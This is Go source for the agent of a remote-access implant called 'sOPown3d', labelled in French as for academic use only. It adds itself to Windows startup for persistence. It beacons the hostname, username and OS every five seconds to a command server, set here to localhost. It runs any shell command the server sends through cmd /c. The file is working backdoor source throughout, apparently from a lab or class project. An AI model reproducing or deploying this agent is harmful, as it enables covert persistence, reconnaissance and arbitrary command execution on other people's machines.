package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"time"

	"sOPown3d/agent/persistence"
	"sOPown3d/shared"
)

func main() {
	fmt.Println("=== Agent sOPown3d - Version Commandes ===")
	fmt.Println("Usage académique uniquement")

	setupPersistence()

	serverURL := "http://127.0.0.1:8080"
	agentID := generateID()

	fmt.Printf("Agent ID: %s\n", agentID)
	fmt.Println("En attente de commandes...")
	fmt.Println("----------------------------------------")

	// Boucle principale
	for i := 1; ; i++ {
		// 1. Préparer infos
		info := gatherSystemInfo()
		info.Hostname = agentID

		// 2. Envoyer beacon
		fmt.Printf("[Tour %d] ", i)
		cmd := sendBeacon(serverURL+"/beacon", info)

		// 3. Exécuter commande si reçue
		if cmd != nil && cmd.Action != "" {
			fmt.Printf("→ Commande: %s\n", cmd.Action)
			executeCommand(cmd)
		} else {
			fmt.Println("Aucune commande")
		}

		// 4. Attendre
		time.Sleep(5 * time.Second)
	}
}

// Générer ID
func generateID() string {
	hostname, _ := os.Hostname()
	return fmt.Sprintf("%s-%d", hostname, time.Now().Unix())
}

// Setup persistance au démarrage
func setupPersistence() {
	fmt.Println("\n[Persistance] Configuration...")

	exePath, err := os.Executable()
	if err != nil {
		fmt.Println("  ✗ Erreur chemin:", err)
		return
	}

	if persistent, path := persistence.CheckStartup(); persistent {
		fmt.Printf("  ✓ Déjà persistant\n  Chemin: %s\n", path)
	} else {
		fmt.Println("  ➔ Ajout au démarrage Windows...")
		if err := persistence.AddToStartup(exePath); err != nil {
			fmt.Printf("  ✗ Échec: %v\n", err)
		} else {
			fmt.Println("  ✓ Persistance activée")
		}
	}
}

// Récupérer infos
func gatherSystemInfo() shared.AgentInfo {
	hostname, _ := os.Hostname()
	username := os.Getenv("USERNAME")

	return shared.AgentInfo{
		Hostname: hostname,
		OS:       runtime.GOOS,
		Username: username,
		Time:     time.Now().Format("15:04:05"),
	}
}

// Envoyer beacon
func sendBeacon(url string, info shared.AgentInfo) *shared.Command {
	jsonData, _ := json.Marshal(info)

	resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	var cmd shared.Command
	if err := json.NewDecoder(resp.Body).Decode(&cmd); err == nil {
		if cmd.Action != "" {
			return &cmd
		}
	}

	return nil
}

// Exécuter commande
func executeCommand(cmd *shared.Command) {
	switch cmd.Action {
	case "shell":
		if cmd.Payload != "" {
			fmt.Printf("Exécute: %s\n", cmd.Payload)

			var output string
			if runtime.GOOS == "windows" {
				result, err := exec.Command("cmd", "/c", cmd.Payload).CombinedOutput()
				if err != nil {
					output = fmt.Sprintf("Erreur: %v", err)
				} else {
					output = string(result)
				}
			}

			fmt.Printf("Résultat:\n%s\n", output)
		}

	case "info":
		fmt.Println("Info: Déjà envoyé dans le beacon")

	case "ping":
		fmt.Println("Pong!")

	case "persist":
		fmt.Println("📋 Vérification persistance...")
		if persistent, path := persistence.CheckStartup(); persistent {
			fmt.Printf("  ✓ Persistant\n  Chemin: %s\n", path)
		} else {
			fmt.Println("  ✗ Non persistant")
		}

	default:
		fmt.Printf("Commande inconnue: %s\n", cmd.Action)
	}
}
